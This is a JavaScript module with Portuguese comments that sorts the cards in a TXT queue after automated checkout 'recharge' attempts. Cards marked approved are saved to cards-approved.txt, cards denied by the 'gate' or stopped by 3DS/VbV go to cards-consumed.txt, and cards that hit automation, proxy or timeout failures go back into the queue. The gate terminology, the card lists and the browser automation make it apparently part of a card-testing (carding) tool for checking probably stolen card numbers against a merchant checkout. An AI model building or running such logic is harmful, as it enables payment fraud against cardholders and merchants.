import { looksLikeCheckoutSuccess } from './checkout-error.mjs';
import { normalizeRechargeStatus } from './recharge-events.mjs';

const stopOnVbv = () => String(process.env.THREEDS_STOP_ON_VBV ?? '0').toLowerCase() === '1';

/** Classifica o que fazer com o cartão da fila TXT após a recarga. */

export function classifyCardListAction({ outcome, error } = {}) {
  const result = outcome?.result ?? {};
  const raw = outcome?.automation?.raw ?? {};
  const gateCode = String(raw.gateCode ?? result.gateCode ?? '').toUpperCase();
  const msg = String(
    result.negativeReason ??
      result.message ??
      raw.gateMessage ??
      raw.message ??
      error?.message ??
      '',
  );

  if (
    looksLikeCheckoutSuccess({
      url: raw.url,
      message: `${msg} ${raw.threeDs?.hint || ''}`,
    })
  ) {
    return 'approved';
  }

  const status = normalizeRechargeStatus(outcome, error);
  if (status === 'success') return 'approved';
  if (status === '3ds') return stopOnVbv() ? 'consumed' : 'return';

  // Cartão inválido na tokenização / Click to Pay (INVALID_STATE).
  if (isUnusableCardMessage(msg) || gateCode === 'INVALID_STATE') {
    return 'consumed';
  }

  // Só sai da fila se a gate recusou de verdade.
  // erro / timeout / falha de automação voltam para reutilizar.
  if (status === 'denied') {
    if (
      isAutomationFailureMessage(msg) &&
      !paymentBodyIsDenied(raw.gateResponse?.body) &&
      gateCode !== 'DENIED' &&
      !isUnusableCardMessage(msg)
    ) {
      return 'return';
    }
    return 'consumed';
  }

  return 'return';
}

/** Elo/Mastercard: campo inválido — cartão sem condição, não reutilizar. */
export function isUnusableCardMessage(msg) {
  return /incorrect field value|INVALID_STATE/i.test(String(msg));
}

export function isGateDenialMessage(msg) {
  return /negad|denied|recusad|n[aã]o autoriz|bloqueado|insuficiente|saldo insuficiente|cart[aã]o inv[aá]lido|transa[cç][aã]o negada|operadora recusou|fraud|fraude|suspeit|CREDIT_CARD\s*-\s*422|n[aã]o foi poss[ií]vel concluir|n[aã]o conseguimos (processar|realizar)|compra n[aã]o conclu[ií]da|informe c[oó]digo\s*\d+|incorrect field value|INVALID_STATE/i.test(
    String(msg),
  );
}

export function isAutomationFailureMessage(msg) {
  return /formul[aá]rio\s+pan|pan n[aã]o abriu|n[aã]o hidrat|n[aã]o capturado|iframe|element|locator|click|limite de \d+ telas|timeout|timed?\s*out|automa[cç][aã]o(\s+http)?|paminfo|error_manual|sess[aã]o|manual|playwright|browser|proxy|fetch failed|net::|econnreset|etimedout|navigation|target closed|page\.goto|page closed|hidrat|checkout pode estar/i.test(
    String(msg),
  );
}

export function paymentBodyIsDenied(body) {
  if (!body || typeof body !== 'object') return false;
  const st = String(
    body.status ?? body.payments?.[0]?.status ?? body.tags?.transaction?.status ?? '',
  ).toUpperCase();
  if (st === 'DENIED' || st === 'REJECTED' || st === 'FAILURE') return true;
  if (Array.isArray(body) && body[0]?.status === 'nok') return true;
  return false;
}

export function cardListActionLabel(action, { outcome } = {}) {
  if (action === 'approved') return '✅ aprovado → salvo em cards-approved.txt';
  if (action === 'consumed') {
    const st = String(outcome?.result?.status ?? '').toUpperCase();
    const rawSt = String(outcome?.automation?.raw?.status ?? '').toLowerCase();
    if (st === '3DS_REQUIRED' || rawSt === '3ds_required') {
      return '🔐 3DS acionado → salvo em cards-consumed.txt';
    }
    return '🚫 negado na gate → salvo em cards-consumed.txt';
  }
  if (action === 'return') return '↩️ falha (não foi a gate) → cartão voltou pra fila';
  return '';
}
